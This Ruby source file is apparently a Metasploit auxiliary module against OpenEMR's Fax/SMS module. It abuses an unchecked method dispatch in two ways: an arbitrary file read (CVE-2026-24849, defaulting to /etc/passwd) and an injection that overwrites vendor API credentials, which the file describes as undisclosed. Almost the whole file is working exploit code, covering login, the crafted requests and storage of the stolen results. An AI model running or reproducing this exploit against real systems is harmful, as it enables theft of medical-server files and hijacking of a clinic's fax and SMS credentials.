class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenEMR FaxSMS AppDispatch Missing-ACL Toolkit',
        'Description'    => %q{
          The OpenEMR Fax/SMS custom module dispatches the _ACTION_COMMAND
          request parameter to any method on the resolved provider class via
          method_exists()/call_user_func(), with no role or permission check
          anywhere in the path. This shared root cause, in the abstract base
          class AppDispatch, enables two distinct issues.

          FILE_READ: any authenticated user, regardless of role, can invoke
          disposeDocument() with an attacker-controlled file_path parameter
          to read arbitrary files as the web server user. Publicly documented
          as CVE-2026-24849, patched in OpenEMR 7.0.4. The same request
          transparently reaches the equivalent method on the RingCentral
          provider class too, since class resolution happens server-side.

          SAVE_SETUP: any authenticated user, regardless of role, can invoke
          the inherited AppDispatch::saveSetup() method to inject or
          overwrite the module's vendor API credentials in the shared
          module_faxsms_credentials table. THIS ISSUE HAS NOT BEEN PUBLICLY
          DISCLOSED. Lab research use only, do not distribute or submit this
          action externally until OpenEMR's security team has been notified.
        },
        'Author'         => [
          'doany1',              # original public PoC / discovery (FILE_READ only)
          'Anonymous Author',     # identity withheld for blind review
        ],
        'References'     => [
          ['CVE', '2026-24849'],
          ['GHSA', 'GHSA-w6vc-hx2x-48pc'],
        ],
        'DisclosureDate' => '2026-06-06',
        'License'        => MSF_LICENSE,
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
        },
        'Actions'        => [
          ['FILE_READ',  { 'Description' => 'Read an arbitrary file via disposeDocument()' }],
          ['SAVE_SETUP', { 'Description' => 'Inject/overwrite vendor credentials via saveSetup() - UNDISCLOSED, lab use only' }],
        ],
        'DefaultAction'  => 'FILE_READ',
      )
    )

    register_options([
      OptString.new('TARGETURI',       [true,  'Base path to OpenEMR', '/']),
      OptString.new('SITE',            [true,  'OpenEMR site id', 'default']),
      OptString.new('USERNAME',        [true,  'OpenEMR login username (any role works)', 'admin']),
      OptString.new('PASSWORD',        [true,  'OpenEMR login password', '']),
      OptString.new('FILE_PATH',       [false, 'FILE_READ: absolute path of the file to read', '/etc/passwd']),
      OptString.new('INJECT_USERNAME', [false, 'SAVE_SETUP: vendor username value to inject', '']),
      OptString.new('INJECT_PASSWORD', [false, 'SAVE_SETUP: vendor password value to inject', '']),
      OptString.new('INJECT_KEY',      [false, 'SAVE_SETUP: vendor API key value to inject', '']),
      OptString.new('INJECT_SECRET',   [false, 'SAVE_SETUP: vendor API secret value to inject', '']),
      Opt::RHOSTS('127.0.0.1'),
      Opt::RPORT(8080),
    ])
  end

  def base
    normalize_uri(target_uri.path)
  end

  def do_login
    site = datastore['SITE']

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'login', 'login.php'),
      'vars_get' => { 'site' => site }
    )

    cookie = res ? res.get_cookies : ''

    post_data = {
      'new_login_session_management' => '1',
      'authProvider'                 => 'Default',
      'authUser'                     => datastore['USERNAME'],
      'clearPass'                    => datastore['PASSWORD'],
      'languageChoice'               => '1',
    }

    if res && res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/m
      post_data['csrf_token_form'] = ::Regexp.last_match(1)
    end

    res2 = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(base, 'interface', 'main', 'main_screen.php'),
      'vars_get'  => { 'auth' => 'login', 'site' => site },
      'vars_post' => post_data,
      'cookie'    => cookie
    )

    new_cookie = res2 ? res2.get_cookies : ''
    cookie = new_cookie.empty? ? cookie : new_cookie

    cookie
  end

  def check
    cookie = do_login

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'),
      'vars_get' => {
        'site'            => datastore['SITE'],
        'type'            => 'fax',
        '_ACTION_COMMAND' => 'disposeDocument',
        'file_path'       => '/etc/hostname',
        'action'          => 'download',
      },
      'cookie'   => cookie
    )

    if res && res.code == 200 && !res.body.to_s.include?('login_screen.php') && !res.body.to_s.strip.empty?
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def run
    case action.name
    when 'FILE_READ'
      do_file_read
    when 'SAVE_SETUP'
      do_save_setup
    else
      print_error("Unknown action: #{action.name}")
    end
  end

  def do_file_read
    cookie = do_login

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'),
      'vars_get' => {
        'site'            => datastore['SITE'],
        'type'            => 'fax',
        '_ACTION_COMMAND' => 'disposeDocument',
        'file_path'       => datastore['FILE_PATH'],
        'action'          => 'download',
      },
      'cookie'   => cookie
    )

    if res.nil?
      print_error('No response from target')
      return
    end

    if res.body.include?('login_screen.php')
      print_error('Login failed - check USERNAME/PASSWORD/SITE')
      return
    end

    if res.body.include?('Problem with download')
      print_error("File not found or not readable: #{datastore['FILE_PATH']}")
      return
    end

    if res.body.to_s.strip.empty?
      print_error('Empty response - file was not read (target likely patched or blocked the request)')
      return
    end

    print_good("Read #{res.body.length} bytes from #{datastore['FILE_PATH']}")
    print_line(res.body)
    loot_path = store_loot('openemr.faxsms.fileread', 'text/plain', rhost, res.body, datastore['FILE_PATH'])
    print_status("Saved to #{loot_path}")
  end

  def do_save_setup
    cookie = do_login

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(base, 'interface', 'modules', 'custom_modules', 'oe-module-faxsms', 'index.php'),
      'vars_get' => {
        'site'            => datastore['SITE'],
        'type'            => 'fax',
        '_ACTION_COMMAND' => 'saveSetup',
        'username'        => datastore['INJECT_USERNAME'],
        'password'        => datastore['INJECT_PASSWORD'],
        'key'             => datastore['INJECT_KEY'],
        'secret'          => datastore['INJECT_SECRET'],
      },
      'cookie'   => cookie
    )

    if res.nil?
      print_error('No response from target')
      return
    end

    if res.body.include?('login_screen.php')
      print_error('Login failed - check USERNAME/PASSWORD/SITE')
      return
    end

    if res.body.include?('Save Success')
      print_good('Vendor credentials injected/overwritten successfully.')
      print_status("Injected - username: #{datastore['INJECT_USERNAME']}, password: #{datastore['INJECT_PASSWORD']}, key: #{datastore['INJECT_KEY']}, secret: #{datastore['INJECT_SECRET']}")
      report_note(
        host: rhost,
        type: 'openemr.faxsms.credential_injection',
        data: "Injected vendor credentials via saveSetup() as user #{datastore['USERNAME']}: username=#{datastore['INJECT_USERNAME']}"
      )
    else
      print_error("Unexpected response, save may have failed: #{res.body.to_s[0,200]}")
    end
  end
end
